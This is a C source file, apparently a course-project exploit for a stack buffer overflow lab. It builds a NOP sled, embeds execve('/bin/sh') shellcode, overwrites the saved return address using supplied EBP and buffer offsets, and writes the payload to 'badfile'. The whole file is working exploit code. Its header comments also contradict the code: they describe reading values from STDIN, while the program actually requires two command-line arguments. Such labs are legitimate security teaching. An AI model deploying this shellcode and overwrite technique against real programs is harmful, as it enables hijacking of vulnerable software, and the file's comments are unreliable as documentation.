// Exploit code for Project 2.
// Description:
// - This code reads in 2 hexadecimal values from STDIN, one per line.
//   These values are EBP and BUFFPTR, respectively.
// - The `print_offset.gdb` script generates a suitable file automatically.
// - Usage via command line IO redirection: ./exploit < offsets.txt


#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] =
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char **argv) 
{
    char buffer[517];
    FILE *badfile;
    long retAddr;
    unsigned long ebp, buffptr;

    // Read in EBP and BUFFPTR values from arguments
	if (argc != 3)
	{
		fprintf(stderr, "Usage: %s ebp bufferptr (%d argument(s) provided)\n", argv[0], argc);
		exit(1);
	}
  
    ebp = strtoul(argv[1], NULL, 16);
    buffptr = strtoul(argv[2], NULL, 16);

    printf("EBP: %lx, BUFFPTR: %lx, OFFSET: %ld\n", ebp, buffptr, ebp - buffptr);

    // Initialize buffer with NOP instructions (0x90)
    memset(&buffer, 0x90, 517);

    // Copy shellcode to the end of buffer 
    memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, sizeof(shellcode));
 
    // Set return address to point immediately before the start of the shell code
    retAddr = (long)(buffptr + sizeof(buffer) - sizeof(shellcode));

    /* Override the old retAddr with the new retAddr
    that either goes thru no-ops to reach the shellcode or
    is the actual location of shellcode.
    Buffer offset for location of retAddress =
    number of bytes between pointer of the vulnerable
    buffer in stack.c and the local frame pointer of stack.c
    plus the size of the local frame pointer. */
    *( (long *) (buffer + ebp - buffptr + 4) ) = retAddr;

    /* Save the contents to the file "badfile". */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

